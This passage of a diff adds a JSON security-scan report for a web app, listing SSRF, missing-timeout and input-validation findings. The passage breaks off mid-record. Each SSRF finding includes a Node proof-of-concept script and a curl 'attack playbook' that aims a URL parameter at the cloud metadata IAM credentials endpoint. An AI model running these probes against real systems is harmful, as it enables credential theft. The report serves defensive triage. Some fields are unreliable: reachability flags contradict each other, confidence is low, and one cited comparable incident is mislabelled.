@@ -1,0 +1,2917 @@
+{
+  "scanId": "fed4a746-a79c-497f-a130-c597c1c08d4f",
+  "startedAt": "2026-06-13T05:27:53.467Z",
+  "durationMs": 3577,
+  "scanned": {
+    "files": 19,
+    "lines": 0
+  },
+  "findings": [
+    {
+      "id": "api/openeo/route.ts:62:68:SSRF",
+      "kind": "sast",
+      "severity": "high",
+      "vuln": "SSRF",
+      "cwe": "CWE-918",
+      "owaspLlm": null,
+      "stride": "Spoofing",
+      "file": "api/openeo/route.ts",
+      "line": 62,
+      "snippet": "const body = new URLSearchParams({",
+      "fix": null,
+      "reachable": false,
+      "triage": 39,
+      "dataClasses": [],
+      "chain": null,
+      "confidence": 0.314,
+      "toxicity": 35,
+      "toxicityFactors": [
+        "high-severity",
+        "http-facing"
+      ],
+      "toxicityLabel": "Medium",
+      "sources": null,
+      "epssScore": null,
+      "epssPercentile": null,
+      "epssCve": null,
+      "exploitedNow": false,
+      "tags": null,
+      "blastRadius": {
+        "scope": "all-users",
+        "dataAtRisk": [
+          "credentials"
+        ],
+        "userCount": 50,
+        "industry": "generic",
+        "jurisdictions": [],
+        "controlsApplied": [],
+        "dollarBest": 24000,
+        "dollarLikely": 138000,
+        "dollarWorst": 777500,
+        "dollarLow": 24000,
+        "dollarHigh": 777500,
+        "components": {
+          "incidentResponse": {
+            "low": 8000,
+            "likely": 50000,
+            "high": 250000
+          },
+          "legal": {
+            "low": 10000,
+            "likely": 75000,
+            "high": 500000
+          },
+          "crisisPR": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "notification": {
+            "low": 5000,
+            "likely": 10000,
+            "high": 15000
+          },
+          "creditMonitoring": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "regulatoryFines": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "directDamage": {
+            "low": 1000,
+            "likely": 3000,
+            "high": 12500
+          },
+          "classAction": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "lostBusiness": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          }
+        },
+        "dominantDriver": "legal counsel",
+        "comparable": "Capital One 2019 SSRF → $190M settlement (100M records, $1.90/rec)",
+        "confidence": "low",
+        "narrative": "SSRF on `api/openeo/route.ts:62` could expose production credentials and API keys. Context: general SaaS / no specific regulatory exposure. Estimated cost: best $24k · likely $138k · worst $778k. Dominant driver: legal counsel. Comparable: Capital One 2019 SSRF → $190M settlement (100M records, $1.90/rec)."
+      },
+      "stableId": "c2a857e6882321cd",
+      "confidenceTier": "low",
+      "exploitability": 0.45,
+      "exploitabilityTier": "medium",
+      "exploitabilityFactors": [
+        "sev:high",
+        "unreachable"
+      ],
+      "clusterSize": null,
+      "unreachable": false,
+      "validator_verdict": "unvalidated",
+      "llm_confidence": null,
+      "unvalidated": true,
+      "cross_language": false,
+      "family": "ssrf",
+      "parser": "REGEX",
+      "_unsigned": false,
+      "_passThroughSigning": false,
+      "signatureStatus": "verified",
+      "regression_test": {
+        "lang": "node",
+        "framework": null,
+        "filename": null,
+        "runHint": null,
+        "code": null
+      },
+      "poc": {
+        "lang": "node",
+        "kind": "http-payload",
+        "cwe": "CWE-918",
+        "family": "ssrf",
+        "runHint": "node poc.mjs",
+        "code": "// Demonstrates SSRF by forcing the server to fetch a localhost sentinel URL.\n// Endpoint:   POST http://localhost:3000/REPLACE-WITH-ENDPOINT\n// Payload:    http://127.0.0.1:65533/poc-ssrf-sentinel\n// Expect:     sentinel server logs a request from the target — proves the target made an outbound call we controlled\n// Run:        node poc.mjs\n// Exit code:  0 = exploit demonstrated, 1 = not demonstrated, 2 = error\n\nconst URL_ = \"http://localhost:3000/REPLACE-WITH-ENDPOINT\";\nconst METHOD = \"POST\";\nconst PAYLOAD = `http://127.0.0.1:65533/poc-ssrf-sentinel`;\n\nconst body = METHOD === 'GET'\n  ? null\n  : JSON.stringify({ \"input\": PAYLOAD });\n\nconst headers = { 'Content-Type': 'application/json' };\n\nconst reqUrl = METHOD === 'GET'\n  ? URL_ + (URL_.includes('?') ? '&' : '?') + \"input\" + '=' + encodeURIComponent(PAYLOAD)\n  : URL_;\n\ntry {\n  const r = await fetch(reqUrl, { method: METHOD, headers, body, redirect: 'follow' });\n  const text = await r.text();\n  const sig = (text.includes(\"http://127.0.0.1:65533/poc-ssrf-sentinel\") ? 'payload reflected' : '');\n  if (sig) {\n    process.stderr.write('PoC: exploit demonstrated — ' + sig + '\\n');\n    process.exit(0);\n  }\n  process.stderr.write('PoC: payload sent (status ' + r.status + '), no exploit evidence in response\\n');\n  process.exit(1);\n} catch (e) {\n  process.stderr.write('PoC: error reaching target — ' + e.message + '\\n');\n  process.exit(2);\n}\n",
+        "paramKey": null,
+        "paramKeyConfidence": "low",
+        "paramKeyInferred": false
+      },
+      "calibrated_confidence": null,
+      "calibrated_confidence_ci": null,
+      "calibrated_n": 24,
+      "calibration_reason": "insufficient-samples",
+      "verifier_verdict": "verified-sanitizer-absence",
+      "verifier_reason": "no-sanitizer-in-window",
+      "verifier_runner": null,
+      "narration": "The handler fetches a URL constructed from user input. An attacker supplies a URL pointing at cloud-metadata endpoints (169.254.169.254 on AWS, metadata.google.internal on GCP) or internal services not exposed externally. Typical impact: theft of IAM credentials attached to the instance, fingerprinting / exploitation of internal services, port-scanning the VPC. Cost: full AWS account compromise in the worst case (IAM credential rotation, audit, blast-radius review of every action taken under the leaked credentials).",
+      "mitigationVerdict": "unreachable-in-prod",
+      "mitigationsApplied": [],
+      "mitigatedByWaf": false,
+      "wafRuleId": null,
+      "mitigatedByAuth": false,
+      "authMechanism": null,
+      "mitigatedByNetwork": false,
+      "networkExposure": null,
+      "featureFlag": null,
+      "featureFlagState": null,
+      "featureFlagRollout": null,
+      "exposedInProd": false,
+      "unreachableInProd": true,
+      "coldPath": false,
+      "hotPath": false,
+      "prodRequestCount": null,
+      "crownJewelScore": 0.1,
+      "crownJewelTier": "low-value",
+      "crownJewelFactors": [
+        "reads-secret-env"
+      ],
+      "cloneClusterId": "c76e7772050db432",
+      "cloneClusterSize": 2,
+      "provenance": "human-likely",
+      "provenanceScore": 0.04,
+      "typeNarrowed": null,
+      "strideCategory": "tampering",
+      "personaScores": {
+        "script-kiddie": {
+          "score": 0.65,
+          "tier": "high",
+          "factors": [
+            "sev:high"
+          ]
+        },
+        "opportunistic-criminal": {
+          "score": 0.85,
+          "tier": "critical",
+          "factors": [
+            "sev:high",
+            "bias:ssrf+0.20"
+          ]
+        },
+        "apt-nation-state": {
+          "score": 0.95,
+          "tier": "critical",
+          "factors": [
+            "sev:high",
+            "bias:ssrf+0.30"
+          ]
+        },
+        "supply-chain-attacker": {
+          "score": 0.65,
+          "tier": "high",
+          "factors": [
+            "sev:high"
+          ]
+        },
+        "malicious-insider": {
+          "score": 0.65,
+          "tier": "high",
+          "factors": [
+            "sev:high"
+          ]
+        }
+      },
+      "personaTopTwo": [
+        "apt-nation-state",
+        "opportunistic-criminal"
+      ],
+      "personaMaxName": "apt-nation-state",
+      "personaMaxScore": 0.95,
+      "reverseExposure": null,
+      "specMined": null,
+      "whyFired": {
+        "detector": "sast/ssrf",
+        "ruleId": "CWE-918",
+        "parser": "REGEX",
+        "evidence": {
+          "sinkSnippet": "const tokenRes = await fetch(discovery.token_endpoint, {",
+          "sourceSnippet": "const body = new URLSearchParams({",
+          "pathSteps": [],
+          "sanitizers": [],
+          "guards": []
+        },
+        "considered": {
+          "suppressionsApplied": [],
+          "suppressionsSkipped": [],
+          "reachabilityFilter": "unaffected",
+          "clusterCollapsed": false,
+          "typeNarrowed": false,
+          "crownJewelTier": "low-value",
+          "mitigationVerdict": "unreachable-in-prod"
+        },
+        "scanner": {
+          "rulesetVersion": null,
+          "packHash": null,
+          "modelId": null
+        }
+      },
+      "adversaryTranscript": null,
+      "predictedBountyUsd": {
+        "low": 100,
+        "likely": 400,
+        "high": 1200,
+        "program": "web2"
+      },
+      "bountyConfidence": "high",
+      "attackPlaybook": {
+        "cwe": "CWE-918",
+        "kind": "curl",
+        "title": "SSRF — cloud metadata probe",
+        "instruction": "Direct the URL parameter at AWS IMDS; if it returns instance data, SSRF is confirmed.",
+        "script": "# AUTHORIZED USE ONLY — run only against systems you own or have explicit permission to test.\n# CWE-918 — SSRF\ncurl -s -i \"${TARGET_URL}/api/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/\"\n# Confirmed when body contains 'AccessKeyId' or 'iam'.",
+        "ethics": "# AUTHORIZED USE ONLY — run only against systems you own or have explicit permission to test."
+      }
+    },
+    {
+      "id": "api/verification/run/route.ts:77:83:SSRF",
+      "kind": "sast",
+      "severity": "high",
+      "vuln": "SSRF",
+      "cwe": "CWE-918",
+      "owaspLlm": null,
+      "stride": "Spoofing",
+      "file": "api/verification/run/route.ts",
+      "line": 77,
+      "snippet": "const body = new URLSearchParams({",
+      "fix": null,
+      "reachable": false,
+      "triage": 39,
+      "dataClasses": [],
+      "chain": null,
+      "confidence": 0.314,
+      "toxicity": 35,
+      "toxicityFactors": [
+        "high-severity",
+        "http-facing"
+      ],
+      "toxicityLabel": "Medium",
+      "sources": null,
+      "epssScore": null,
+      "epssPercentile": null,
+      "epssCve": null,
+      "exploitedNow": false,
+      "tags": null,
+      "blastRadius": {
+        "scope": "all-users",
+        "dataAtRisk": [
+          "credentials"
+        ],
+        "userCount": 50,
+        "industry": "generic",
+        "jurisdictions": [],
+        "controlsApplied": [],
+        "dollarBest": 24000,
+        "dollarLikely": 138000,
+        "dollarWorst": 777500,
+        "dollarLow": 24000,
+        "dollarHigh": 777500,
+        "components": {
+          "incidentResponse": {
+            "low": 8000,
+            "likely": 50000,
+            "high": 250000
+          },
+          "legal": {
+            "low": 10000,
+            "likely": 75000,
+            "high": 500000
+          },
+          "crisisPR": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "notification": {
+            "low": 5000,
+            "likely": 10000,
+            "high": 15000
+          },
+          "creditMonitoring": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "regulatoryFines": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "directDamage": {
+            "low": 1000,
+            "likely": 3000,
+            "high": 12500
+          },
+          "classAction": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "lostBusiness": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          }
+        },
+        "dominantDriver": "legal counsel",
+        "comparable": "Capital One 2019 SSRF → $190M settlement (100M records, $1.90/rec)",
+        "confidence": "low",
+        "narrative": "SSRF on `api/verification/run/route.ts:77` could expose production credentials and API keys. Context: general SaaS / no specific regulatory exposure. Estimated cost: best $24k · likely $138k · worst $778k. Dominant driver: legal counsel. Comparable: Capital One 2019 SSRF → $190M settlement (100M records, $1.90/rec)."
+      },
+      "stableId": "0edaa6ea5bb953ca",
+      "confidenceTier": "low",
+      "exploitability": 0.45,
+      "exploitabilityTier": "medium",
+      "exploitabilityFactors": [
+        "sev:high",
+        "unreachable"
+      ],
+      "clusterSize": null,
+      "unreachable": false,
+      "validator_verdict": "unvalidated",
+      "llm_confidence": null,
+      "unvalidated": true,
+      "cross_language": false,
+      "family": "ssrf",
+      "parser": "REGEX",
+      "_unsigned": false,
+      "_passThroughSigning": false,
+      "signatureStatus": "verified",
+      "regression_test": {
+        "lang": "node",
+        "framework": null,
+        "filename": null,
+        "runHint": null,
+        "code": null
+      },
+      "poc": {
+        "lang": "node",
+        "kind": "http-payload",
+        "cwe": "CWE-918",
+        "family": "ssrf",
+        "runHint": "node poc.mjs",
+        "code": "// Demonstrates SSRF by forcing the server to fetch a localhost sentinel URL.\n// Endpoint:   POST http://localhost:3000/REPLACE-WITH-ENDPOINT\n// Payload:    http://127.0.0.1:65533/poc-ssrf-sentinel\n// Expect:     sentinel server logs a request from the target — proves the target made an outbound call we controlled\n// Run:        node poc.mjs\n// Exit code:  0 = exploit demonstrated, 1 = not demonstrated, 2 = error\n\nconst URL_ = \"http://localhost:3000/REPLACE-WITH-ENDPOINT\";\nconst METHOD = \"POST\";\nconst PAYLOAD = `http://127.0.0.1:65533/poc-ssrf-sentinel`;\n\nconst body = METHOD === 'GET'\n  ? null\n  : JSON.stringify({ \"input\": PAYLOAD });\n\nconst headers = { 'Content-Type': 'application/json' };\n\nconst reqUrl = METHOD === 'GET'\n  ? URL_ + (URL_.includes('?') ? '&' : '?') + \"input\" + '=' + encodeURIComponent(PAYLOAD)\n  : URL_;\n\ntry {\n  const r = await fetch(reqUrl, { method: METHOD, headers, body, redirect: 'follow' });\n  const text = await r.text();\n  const sig = (text.includes(\"http://127.0.0.1:65533/poc-ssrf-sentinel\") ? 'payload reflected' : '');\n  if (sig) {\n    process.stderr.write('PoC: exploit demonstrated — ' + sig + '\\n');\n    process.exit(0);\n  }\n  process.stderr.write('PoC: payload sent (status ' + r.status + '), no exploit evidence in response\\n');\n  process.exit(1);\n} catch (e) {\n  process.stderr.write('PoC: error reaching target — ' + e.message + '\\n');\n  process.exit(2);\n}\n",
+        "paramKey": null,
+        "paramKeyConfidence": "low",
+        "paramKeyInferred": false
+      },
+      "calibrated_confidence": null,
+      "calibrated_confidence_ci": null,
+      "calibrated_n": 24,
+      "calibration_reason": "insufficient-samples",
+      "verifier_verdict": "verified-sanitizer-absence",
+      "verifier_reason": "no-sanitizer-in-window",
+      "verifier_runner": null,
+      "narration": "The handler fetches a URL constructed from user input. An attacker supplies a URL pointing at cloud-metadata endpoints (169.254.169.254 on AWS, metadata.google.internal on GCP) or internal services not exposed externally. Typical impact: theft of IAM credentials attached to the instance, fingerprinting / exploitation of internal services, port-scanning the VPC. Cost: full AWS account compromise in the worst case (IAM credential rotation, audit, blast-radius review of every action taken under the leaked credentials).",
+      "mitigationVerdict": "unreachable-in-prod",
+      "mitigationsApplied": [],
+      "mitigatedByWaf": false,
+      "wafRuleId": null,
+      "mitigatedByAuth": false,
+      "authMechanism": null,
+      "mitigatedByNetwork": false,
+      "networkExposure": null,
+      "featureFlag": null,
+      "featureFlagState": null,
+      "featureFlagRollout": null,
+      "exposedInProd": false,
+      "unreachableInProd": true,
+      "coldPath": false,
+      "hotPath": false,
+      "prodRequestCount": null,
+      "crownJewelScore": 0.1,
+      "crownJewelTier": "low-value",
+      "crownJewelFactors": [
+        "reads-secret-env"
+      ],
+      "cloneClusterId": "c76e7772050db432",
+      "cloneClusterSize": 2,
+      "provenance": "human-likely",
+      "provenanceScore": 0,
+      "typeNarrowed": null,
+      "strideCategory": "tampering",
+      "personaScores": {
+        "script-kiddie": {
+          "score": 0.65,
+          "tier": "high",
+          "factors": [
+            "sev:high"
+          ]
+        },
+        "opportunistic-criminal": {
+          "score": 0.85,
+          "tier": "critical",
+          "factors": [
+            "sev:high",
+            "bias:ssrf+0.20"
+          ]
+        },
+        "apt-nation-state": {
+          "score": 0.95,
+          "tier": "critical",
+          "factors": [
+            "sev:high",
+            "bias:ssrf+0.30"
+          ]
+        },
+        "supply-chain-attacker": {
+          "score": 0.65,
+          "tier": "high",
+          "factors": [
+            "sev:high"
+          ]
+        },
+        "malicious-insider": {
+          "score": 0.65,
+          "tier": "high",
+          "factors": [
+            "sev:high"
+          ]
+        }
+      },
+      "personaTopTwo": [
+        "apt-nation-state",
+        "opportunistic-criminal"
+      ],
+      "personaMaxName": "apt-nation-state",
+      "personaMaxScore": 0.95,
+      "reverseExposure": null,
+      "specMined": null,
+      "whyFired": {
+        "detector": "sast/ssrf",
+        "ruleId": "CWE-918",
+        "parser": "REGEX",
+        "evidence": {
+          "sinkSnippet": "const tokenRes = await fetch(discovery.token_endpoint, {",
+          "sourceSnippet": "const body = new URLSearchParams({",
+          "pathSteps": [],
+          "sanitizers": [],
+          "guards": []
+        },
+        "considered": {
+          "suppressionsApplied": [],
+          "suppressionsSkipped": [],
+          "reachabilityFilter": "unaffected",
+          "clusterCollapsed": false,
+          "typeNarrowed": false,
+          "crownJewelTier": "low-value",
+          "mitigationVerdict": "unreachable-in-prod"
+        },
+        "scanner": {
+          "rulesetVersion": null,
+          "packHash": null,
+          "modelId": null
+        }
+      },
+      "adversaryTranscript": null,
+      "predictedBountyUsd": {
+        "low": 100,
+        "likely": 400,
+        "high": 1200,
+        "program": "web2"
+      },
+      "bountyConfidence": "high",
+      "attackPlaybook": {
+        "cwe": "CWE-918",
+        "kind": "curl",
+        "title": "SSRF — cloud metadata probe",
+        "instruction": "Direct the URL parameter at AWS IMDS; if it returns instance data, SSRF is confirmed.",
+        "script": "# AUTHORIZED USE ONLY — run only against systems you own or have explicit permission to test.\n# CWE-918 — SSRF\ncurl -s -i \"${TARGET_URL}/api/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/\"\n# Confirmed when body contains 'AccessKeyId' or 'iam'.",
+        "ethics": "# AUTHORIZED USE ONLY — run only against systems you own or have explicit permission to test."
+      }
+    },
+    {
+      "id": "api/verification/run/route.ts:77:229:SSRF",
+      "kind": "sast",
+      "severity": "high",
+      "vuln": "SSRF",
+      "cwe": "CWE-918",
+      "owaspLlm": null,
+      "stride": "Spoofing",
+      "file": "api/verification/run/route.ts",
+      "line": 77,
+      "snippet": "const body = new URLSearchParams({",
+      "fix": null,
+      "reachable": false,
+      "triage": 39,
+      "dataClasses": [],
+      "chain": null,
+      "confidence": 0.314,
+      "toxicity": 35,
+      "toxicityFactors": [
+        "high-severity",
+        "http-facing"
+      ],
+      "toxicityLabel": "Medium",
+      "sources": null,
+      "epssScore": null,
+      "epssPercentile": null,
+      "epssCve": null,
+      "exploitedNow": false,
+      "tags": null,
+      "blastRadius": {
+        "scope": "all-users",
+        "dataAtRisk": [
+          "credentials"
+        ],
+        "userCount": 50,
+        "industry": "generic",
+        "jurisdictions": [],
+        "controlsApplied": [],
+        "dollarBest": 24000,
+        "dollarLikely": 138000,
+        "dollarWorst": 777500,
+        "dollarLow": 24000,
+        "dollarHigh": 777500,
+        "components": {
+          "incidentResponse": {
+            "low": 8000,
+            "likely": 50000,
+            "high": 250000
+          },
+          "legal": {
+            "low": 10000,
+            "likely": 75000,
+            "high": 500000
+          },
+          "crisisPR": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "notification": {
+            "low": 5000,
+            "likely": 10000,
+            "high": 15000
+          },
+          "creditMonitoring": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "regulatoryFines": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "directDamage": {
+            "low": 1000,
+            "likely": 3000,
+            "high": 12500
+          },
+          "classAction": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "lostBusiness": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          }
+        },
+        "dominantDriver": "legal counsel",
+        "comparable": "Capital One 2019 SSRF → $190M settlement (100M records, $1.90/rec)",
+        "confidence": "low",
+        "narrative": "SSRF on `api/verification/run/route.ts:77` could expose production credentials and API keys. Context: general SaaS / no specific regulatory exposure. Estimated cost: best $24k · likely $138k · worst $778k. Dominant driver: legal counsel. Comparable: Capital One 2019 SSRF → $190M settlement (100M records, $1.90/rec)."
+      },
+      "stableId": "50ff2994bae98bad",
+      "confidenceTier": "low",
+      "exploitability": 0.45,
+      "exploitabilityTier": "medium",
+      "exploitabilityFactors": [
+        "sev:high",
+        "unreachable"
+      ],
+      "clusterSize": null,
+      "unreachable": false,
+      "validator_verdict": "unvalidated",
+      "llm_confidence": null,
+      "unvalidated": true,
+      "cross_language": false,
+      "family": "ssrf",
+      "parser": "REGEX",
+      "_unsigned": false,
+      "_passThroughSigning": false,
+      "signatureStatus": "verified",
+      "regression_test": {
+        "lang": "node",
+        "framework": null,
+        "filename": null,
+        "runHint": null,
+        "code": null
+      },
+      "poc": {
+        "lang": "node",
+        "kind": "http-payload",
+        "cwe": "CWE-918",
+        "family": "ssrf",
+        "runHint": "node poc.mjs",
+        "code": "// Demonstrates SSRF by forcing the server to fetch a localhost sentinel URL.\n// Endpoint:   POST http://localhost:3000/REPLACE-WITH-ENDPOINT\n// Payload:    http://127.0.0.1:65533/poc-ssrf-sentinel\n// Expect:     sentinel server logs a request from the target — proves the target made an outbound call we controlled\n// Run:        node poc.mjs\n// Exit code:  0 = exploit demonstrated, 1 = not demonstrated, 2 = error\n\nconst URL_ = \"http://localhost:3000/REPLACE-WITH-ENDPOINT\";\nconst METHOD = \"POST\";\nconst PAYLOAD = `http://127.0.0.1:65533/poc-ssrf-sentinel`;\n\nconst body = METHOD === 'GET'\n  ? null\n  : JSON.stringify({ \"input\": PAYLOAD });\n\nconst headers = { 'Content-Type': 'application/json' };\n\nconst reqUrl = METHOD === 'GET'\n  ? URL_ + (URL_.includes('?') ? '&' : '?') + \"input\" + '=' + encodeURIComponent(PAYLOAD)\n  : URL_;\n\ntry {\n  const r = await fetch(reqUrl, { method: METHOD, headers, body, redirect: 'follow' });\n  const text = await r.text();\n  const sig = (text.includes(\"http://127.0.0.1:65533/poc-ssrf-sentinel\") ? 'payload reflected' : '');\n  if (sig) {\n    process.stderr.write('PoC: exploit demonstrated — ' + sig + '\\n');\n    process.exit(0);\n  }\n  process.stderr.write('PoC: payload sent (status ' + r.status + '), no exploit evidence in response\\n');\n  process.exit(1);\n} catch (e) {\n  process.stderr.write('PoC: error reaching target — ' + e.message + '\\n');\n  process.exit(2);\n}\n",
+        "paramKey": null,
+        "paramKeyConfidence": "low",
+        "paramKeyInferred": false
+      },
+      "calibrated_confidence": null,
+      "calibrated_confidence_ci": null,
+      "calibrated_n": 24,
+      "calibration_reason": "insufficient-samples",
+      "verifier_verdict": "verified-sanitizer-absence",
+      "verifier_reason": "no-sanitizer-in-window",
+      "verifier_runner": null,
+      "narration": "The handler fetches a URL constructed from user input. An attacker supplies a URL pointing at cloud-metadata endpoints (169.254.169.254 on AWS, metadata.google.internal on GCP) or internal services not exposed externally. Typical impact: theft of IAM credentials attached to the instance, fingerprinting / exploitation of internal services, port-scanning the VPC. Cost: full AWS account compromise in the worst case (IAM credential rotation, audit, blast-radius review of every action taken under the leaked credentials).",
+      "mitigationVerdict": "unreachable-in-prod",
+      "mitigationsApplied": [],
+      "mitigatedByWaf": false,
+      "wafRuleId": null,
+      "mitigatedByAuth": false,
+      "authMechanism": null,
+      "mitigatedByNetwork": false,
+      "networkExposure": null,
+      "featureFlag": null,
+      "featureFlagState": null,
+      "featureFlagRollout": null,
+      "exposedInProd": false,
+      "unreachableInProd": true,
+      "coldPath": false,
+      "hotPath": false,
+      "prodRequestCount": null,
+      "crownJewelScore": 0.1,
+      "crownJewelTier": "low-value",
+      "crownJewelFactors": [
+        "reads-secret-env"
+      ],
+      "cloneClusterId": "e62d48dea4971b72",
+      "cloneClusterSize": 2,
+      "provenance": "human-likely",
+      "provenanceScore": 0,
+      "typeNarrowed": null,
+      "strideCategory": "tampering",
+      "personaScores": {
+        "script-kiddie": {
+          "score": 0.65,
+          "tier": "high",
+          "factors": [
+            "sev:high"
+          ]
+        },
+        "opportunistic-criminal": {
+          "score": 0.85,
+          "tier": "critical",
+          "factors": [
+            "sev:high",
+            "bias:ssrf+0.20"
+          ]
+        },
+        "apt-nation-state": {
+          "score": 0.95,
+          "tier": "critical",
+          "factors": [
+            "sev:high",
+            "bias:ssrf+0.30"
+          ]
+        },
+        "supply-chain-attacker": {
+          "score": 0.65,
+          "tier": "high",
+          "factors": [
+            "sev:high"
+          ]
+        },
+        "malicious-insider": {
+          "score": 0.65,
+          "tier": "high",
+          "factors": [
+            "sev:high"
+          ]
+        }
+      },
+      "personaTopTwo": [
+        "apt-nation-state",
+        "opportunistic-criminal"
+      ],
+      "personaMaxName": "apt-nation-state",
+      "personaMaxScore": 0.95,
+      "reverseExposure": null,
+      "specMined": null,
+      "whyFired": {
+        "detector": "sast/ssrf",
+        "ruleId": "CWE-918",
+        "parser": "REGEX",
+        "evidence": {
+          "sinkSnippet": "const resultRes = await fetch(`${openeoApiBase}/result`, {",
+          "sourceSnippet": "const body = new URLSearchParams({",
+          "pathSteps": [],
+          "sanitizers": [],
+          "guards": []
+        },
+        "considered": {
+          "suppressionsApplied": [],
+          "suppressionsSkipped": [],
+          "reachabilityFilter": "unaffected",
+          "clusterCollapsed": false,
+          "typeNarrowed": false,
+          "crownJewelTier": "low-value",
+          "mitigationVerdict": "unreachable-in-prod"
+        },
+        "scanner": {
+          "rulesetVersion": null,
+          "packHash": null,
+          "modelId": null
+        }
+      },
+      "adversaryTranscript": null,
+      "predictedBountyUsd": {
+        "low": 100,
+        "likely": 400,
+        "high": 1200,
+        "program": "web2"
+      },
+      "bountyConfidence": "high",
+      "attackPlaybook": {
+        "cwe": "CWE-918",
+        "kind": "curl",
+        "title": "SSRF — cloud metadata probe",
+        "instruction": "Direct the URL parameter at AWS IMDS; if it returns instance data, SSRF is confirmed.",
+        "script": "# AUTHORIZED USE ONLY — run only against systems you own or have explicit permission to test.\n# CWE-918 — SSRF\ncurl -s -i \"${TARGET_URL}/api/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/\"\n# Confirmed when body contains 'AccessKeyId' or 'iam'.",
+        "ethics": "# AUTHORIZED USE ONLY — run only against systems you own or have explicit permission to test."
+      }
+    },
+    {
+      "id": "8c7596007cc6f0ce",
+      "kind": "logic",
+      "severity": "medium",
+      "vuln": "Missing Timeout on Outbound HTTP Request (DoS)",
+      "cwe": "CWE-400",
+      "stride": "Denial of Service",
+      "file": "aid/page.tsx",
+      "line": 28,
+      "snippet": "const prepareRes = await fetch(\"/api/stellar\", {",
+      "fix": {
+        "description": "Set a timeout on all outbound requests to prevent event-loop starvation from stalled upstreams.",
+        "code": "// fetch (Node 18+)\nconst resp = await fetch(url, { signal: AbortSignal.timeout(5000) });\n\n// axios\nawait axios.get(url, { timeout: 5000 });\n\n// node http\nconst req = http.get(url, cb);\nreq.setTimeout(5000, () => req.destroy());"
+      },
+      "blastRadius": {
+        "scope": "all-users",
+        "dataAtRisk": [
+          "config"
+        ],
+        "userCount": 50,
+        "industry": "generic",
+        "jurisdictions": [],
+        "controlsApplied": [],
+        "dollarBest": 23250,
+        "dollarLikely": 136250,
+        "dollarWorst": 775000,
+        "dollarLow": 23250,
+        "dollarHigh": 775000,
+        "components": {
+          "incidentResponse": {
+            "low": 8000,
+            "likely": 50000,
+            "high": 250000
+          },
+          "legal": {
+            "low": 10000,
+            "likely": 75000,
+            "high": 500000
+          },
+          "crisisPR": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "notification": {
+            "low": 5000,
+            "likely": 10000,
+            "high": 15000
+          },
+          "creditMonitoring": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "regulatoryFines": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "directDamage": {
+            "low": 250,
+            "likely": 1250,
+            "high": 10000
+          },
+          "classAction": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "lostBusiness": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          }
+        },
+        "dominantDriver": "legal counsel",
+        "comparable": "Air Canada 2024 LLM chatbot DoS → court-ordered refunds + reputational damage",
+        "confidence": "low",
+        "narrative": "Missing Timeout on Outbound HTTP Request (DoS) on `aid/page.tsx:28` could expose configuration / internal data. Context: general SaaS / no specific regulatory exposure. Estimated cost: best $23k · likely $136k · worst $775k. Dominant driver: legal counsel. Comparable: Air Canada 2024 LLM chatbot DoS → court-ordered refunds + reputational damage."
+      },
+      "parser": "LOGIC",
+      "family": null
+    },
+    {
+      "id": "0383d4666e03873f",
+      "kind": "logic",
+      "severity": "medium",
+      "vuln": "Missing Unsigned Numeric Validation",
+      "cwe": "CWE-20",
+      "stride": "Tampering",
+      "file": "explore/ExploreWorkspace.tsx",
+      "line": 290,
+      "snippet": "if (!price || price <= 0) throw new Error(\"Enter a valid price.\");",
+      "fix": {
+        "description": "Validate that numeric inputs are positive integers server-side before processing.",
+        "code": "// BEFORE\nawait BasketItem.update({ quantity: req.body.quantity });\n\n// AFTER\nif (!Number.isInteger(req.body.quantity) || req.body.quantity < 1)\n  return res.status(400).json({ error: 'Invalid quantity' });"
+      },
+      "blastRadius": {
+        "scope": "all-users",
+        "dataAtRisk": [
+          "config"
+        ],
+        "userCount": 50,
+        "industry": "generic",
+        "jurisdictions": [],
+        "controlsApplied": [],
+        "dollarBest": 23250,
+        "dollarLikely": 136250,
+        "dollarWorst": 775000,
+        "dollarLow": 23250,
+        "dollarHigh": 775000,
+        "components": {
+          "incidentResponse": {
+            "low": 8000,
+            "likely": 50000,
+            "high": 250000
+          },
+          "legal": {
+            "low": 10000,
+            "likely": 75000,
+            "high": 500000
+          },
+          "crisisPR": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "notification": {
+            "low": 5000,
+            "likely": 10000,
+            "high": 15000
+          },
+          "creditMonitoring": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "regulatoryFines": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "directDamage": {
+            "low": 250,
+            "likely": 1250,
+            "high": 10000
+          },
+          "classAction": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "lostBusiness": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          }
+        },
+        "dominantDriver": "legal counsel",
+        "comparable": "Generic finding — likely cost driven by user count + jurisdiction stack",
+        "confidence": "low",
+        "narrative": "Missing Unsigned Numeric Validation on `explore/ExploreWorkspace.tsx:290` could expose configuration / internal data. Context: general SaaS / no specific regulatory exposure. Estimated cost: best $23k · likely $136k · worst $775k. Dominant driver: legal counsel. Comparable: Generic finding — likely cost driven by user count + jurisdiction stack."
+      },
+      "parser": "LOGIC",
+      "family": null
+    },
+    {
+      "id": "3e78ca319085c6d6",
